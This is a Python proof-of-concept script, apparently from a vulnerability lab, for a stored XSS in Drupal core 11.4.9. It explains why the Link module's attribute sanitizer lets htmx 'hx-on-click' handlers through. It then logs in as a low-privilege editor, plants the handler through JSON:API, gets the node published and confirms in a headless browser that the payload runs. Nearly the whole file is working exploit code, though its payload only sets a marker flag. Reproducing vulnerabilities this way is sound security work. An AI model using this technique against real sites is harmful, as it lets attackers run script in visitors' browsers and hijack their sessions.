#!/usr/bin/env python3
"""
PoC — SA-CORE-2026-015 / CVE-2026-108515
Drupal core 11.4.9 — htmx event-handler attributes survive the Link module's
attribute sanitizer, giving stored XSS.

Root cause (core/modules/link/src/AttributeXss.php:41-48):

    $skip = (
      $attribute_name == 'style' ||
      str_starts_with($attribute_name, 'on') ||
      str_starts_with($attribute_name, '-') ||      <-- no 'hx' / 'data-hx'
      strlen($attribute_name) > 96
    );

Drupal ships htmx 2.0.4 (core/core.libraries.yml:845). htmx executes
"hx-on-<event>" and "data-hx-on-<event>" attributes as inline JavaScript
(core/assets/vendor/htmx/htmx.js:2916-2936) and processes the whole document
body on load (:5116-5121). htmx is enabled by default because big_pipe is a
standard-profile dependency (core/profiles/standard/standard.info.yml:23).

The link item's 'options.attributes' map is writable through the
REST/JSON:API representation, which core's own REST test suite asserts
(core/modules/menu_link_content/tests/src/Functional/Rest/
MenuLinkContentResourceTestBase.php:80-92).

Usage:
    python3 f2_link_htmx_xss.py [--url http://localhost:8080] [--no-browser]
"""

from __future__ import annotations

import argparse
import json
import re
import sys

from common import (
    ADMIN_PASS,
    ADMIN_USER,
    BASE_URL,
    EDITOR_PASS,
    EDITOR_USER,
    Lab,
    bad,
    browser_available,
    head,
    info,
    ok,
    require_site,
    run_browser,
)

# htmx evaluates hx-on handlers with 'event' in scope
# (new Function('event', code) in core/assets/vendor/htmx/htmx.js:2904), so a
# realistic payload can also suppress the navigation.
PAYLOAD = "window.__vulnlab_xss = true; event.preventDefault();"


def _link_value() -> dict:
    """The link item's own property values."""
    return {
        "uri": "https://example.com/vulnlab",
        "title": "Click me",
        "options": {
            "attributes": {
                "hx-on-click": PAYLOAD,
            },
        },
    }


def _payload_shapes(title: str) -> list[dict]:
    """
    The three shapes Drupal's JSON:API accepts for a single-value field.

    They differ only in how the item is wrapped; the lab tries them in order
    and keeps the first one the server accepts.
    """
    return [
        {"data": {"type": "node--vulnlab_article", "attributes": {
            "title": title,
            "lab_link": [{"value": _link_value()}],
        }}},
        {"data": {"type": "node--vulnlab_article", "attributes": {
            "title": title,
            "lab_link": [_link_value()],
        }}},
        {"data": {"type": "node--vulnlab_article", "attributes": {
            "title": title,
            "lab_link": {"value": _link_value()},
        }}},
    ]


def create_article(lab: Lab, title: str) -> tuple[str | None, str | None]:
    """
    Creates the article as the low-privilege editor.

    Returns (uuid, path). The path may be None while the node is
    unpublished, because Drupal has no 'publish own <type>' permission.
    """
    last = ""
    for payload in _payload_shapes(title):
        status, _, body = lab.jsonapi("/jsonapi/node/vulnlab_article", payload)
        last = f"HTTP {status}: {body[:200]}"
        if status not in (200, 201):
            info(f"shape rejected ({status}), trying the next one")
            continue
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            return None, None
        return data.get("data", {}).get("id"), _path_of(data)
    info(f"could not create the article: {last}")
    return None, None


def _path_of(data: dict) -> str | None:
    path = data.get("data", {}).get("attributes", {}).get("path")
    if isinstance(path, dict):
        # JSON:API 1.1 exposes 'path' as an object.
        path = path.get("alias") or path.get("pid")
    return path or None


def find_node_path(lab: Lab, title: str) -> str | None:
    """
    Finds a published node's front-end path.

    Drupal 11 does not generate URL aliases automatically, so a node without
    an alias field lives at /node/<nid> and JSON:API does not expose the
    numeric id. The content list does, so we pick the link from there.
    """
    for candidate in ("/admin/content", "/node", "/vulnlab-article"):
        status, _, html = lab.get(candidate)
        if status != 200:
            continue
        for match in re.finditer(r'<a[^>]+href="([^"]+)"[^>]*>(.*?)</a>', html, re.S):
            href, text = match.group(1), re.sub(r"<[^>]+>", "", match.group(2)).strip()
            if text == title:
                return href
    return None


def publish(admin: Lab, uuid: str) -> str | None:
    """
    Publishes the node, the way a moderator would.

    Drupal has no 'publish own <type>' permission, so the editor cannot do
    this - and it does not need to: the point of the lab is that the EDITOR
    can plant the payload.
    """
    payload = {
        "data": {
            "type": "node--vulnlab_article",
            "id": uuid,
            "attributes": {"status": True},
        }
    }
    status, _, body = admin.jsonapi(f"/jsonapi/node/vulnlab_article/{uuid}", payload, method="PATCH")
    if status not in (200, 204):
        info(f"could not publish the node ({status}): {body[:200]}")
        return None
    # A 204 has no body, so read the resource back for its path.
    status, _, body = admin.jsonapi(f"/jsonapi/node/vulnlab_article/{uuid}")
    if status == 200:
        try:
            return _path_of(json.loads(body))
        except json.JSONDecodeError:
            return None
    return None


def run(lab: Lab, use_browser: bool) -> bool:
    head("SA-CORE-2026-015 — link attribute sanitizer / htmx stored XSS")

    if not lab.login(EDITOR_USER, EDITOR_PASS):
        bad(f"could not log in as {EDITOR_USER} (the low-privilege editor)")
        return False
    ok(f"logged in as the low-privilege editor '{EDITOR_USER}'")

    title = "VulnLab htmx XSS article"
    uuid, path = create_article(lab, title)
    if uuid is None:
        bad("could not create the article through JSON:API")
        return False
    ok(f"planted the payload through the REST/JSON:API representation: {uuid}")

    # Drupal has no 'publish own' permission, so a moderator publishes it.
    admin = Lab(lab.base)
    if not admin.login(ADMIN_USER, ADMIN_PASS):
        bad("admin login failed")
        return False
    published_path = publish(admin, uuid)
    path = published_path or path
    if not path:
        path = find_node_path(admin, title)
    if not path:
        bad("could not determine the node path")
        return False
    ok(f"node published by the moderator: {path}")

    # 1. Does the attribute survive Drupal's own sanitiser and reach the page?
    anon = Lab(lab.base)
    status, _, html = anon.get(path)
    if status != 200:
        bad(f"GET {path} returned {status}")
        return False

    if "hx-on-click" in html:
        ok("the htmx event handler survived Drupal's attribute sanitizer")
        for line in html.splitlines():
            if "hx-on-click" in line:
                snippet = line.strip()[:200]
                print(f"        {snippet}")
                break
    else:
        bad("hx-on-click was stripped — the link formatter did not emit it")
        return False

    # 2. Does htmx actually execute it?
    if not use_browser:
        info("browser proof skipped (--no-browser)")
        return True

    if not browser_available():
        info("no headless browser available, skipping the execution proof")
        return True

    url = anon.url(path)
    fired, detail = run_browser(
        url,
        "() => window.__vulnlab_xss === true",
        click_selector="a[hx-on-click]",
    )
    if fired:
        ok("the payload EXECUTED in a real browser (htmx registered the handler)")
        return True

    bad(f"the payload did not execute in the browser: {detail}")
    return False


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=BASE_URL, help="base URL of the lab site")
    parser.add_argument("--no-browser", action="store_true", help="skip the headless browser proof")
    args = parser.parse_args()

    head("SA-CORE-2026-015 / CVE-2026-108515 — link htmx stored XSS")
    if not require_site(args.url):
        return 2

    lab = Lab(args.url)
    if run(lab, not args.no_browser):
        ok("F2 reproduced: htmx event handler stored and executed.")
        return 0
    bad("F2 NOT fully reproduced.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
